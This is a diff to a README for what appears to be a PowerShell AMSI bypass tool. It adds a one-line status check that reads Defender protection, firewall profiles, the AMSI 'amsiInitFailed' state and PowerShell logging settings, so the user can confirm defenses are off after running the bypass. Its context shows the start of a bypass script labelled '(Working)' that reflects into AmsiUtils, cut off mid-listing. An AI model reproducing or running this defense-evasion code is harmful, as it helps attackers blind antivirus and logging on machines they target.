@@ -45,6 +45,14 @@ This makes the current PowerShell process behave as if AMSI initialization faile
 
 ## **How To Use**
 
+### ** First run the status check command to get the current status/value of AMSI,Defender,Firewall**
+ - If it says running run the AMSI Bypass Script and then run again Status check Script.
+
+**Status Check **
+```bash
+$s=Get-MpComputerStatus; $fw=Get-NetFirewallProfile; $t=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $f=$t.GetField('amsiInitFailed','NonPublic,Static'); $a=$f.GetValue($null); $sb=(Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction Ignore).EnableScriptBlockLogging; $tm=(Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction Ignore).EnableTranscripting; [pscustomobject]@{"Real-Time Protection"=if($s.RealTimeProtectionEnabled){"TRUE & Running"}else{"Turned Off"};"IOAV Protection"=if($s.IoavProtectionEnabled){"TRUE & Running"}else{"Turned Off"};"Behavior Monitoring"=if($s.BehaviorMonitorEnabled){"TRUE & Running"}else{"Turned Off"};"Antispyware"=if($s.AntispywareEnabled){"TRUE & Running"}else{"Turned Off"};"Anti-Malware Service"=if($s.AMServiceEnabled){"TRUE & Running"}else{"Turned Off"};"Firewall Domain"=if(($fw|? Name -eq 'Domain').Enabled){"TRUE & Running"}else{"Turned Off"};"Firewall Private"=if(($fw|? Name -eq 'Private').Enabled){"TRUE & Running"}else{"Turned Off"};"Firewall Public"=if(($fw|? Name -eq 'Public').Enabled){"TRUE & Running"}else{"Turned Off"};"AMSI Status"=if(-not $a){"AMSI is Running"}else{"AMSI NOT Running / Bypassed"};"Script Block Logging"=if($sb){"Enabled"}else{"Not Configured"};"Transcription Logging"=if($tm){"Enabled"}else{"Not Configured"};"Language Mode"=$ExecutionContext.SessionState.LanguageMode} | Format-List
+```
+
 ### **1. AMSI Bypass Script [Past both line Seprate / one by one] (Working)**
 ```bash
 $v1=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); if($v1){$v2=$v1.GetField('amsiInitFailed','NonPublic,Static'); if($v2){"AMSI Bypass Patch Applied Successfully!"}else{"Field not found"}}else{"Type not resolved"}; 
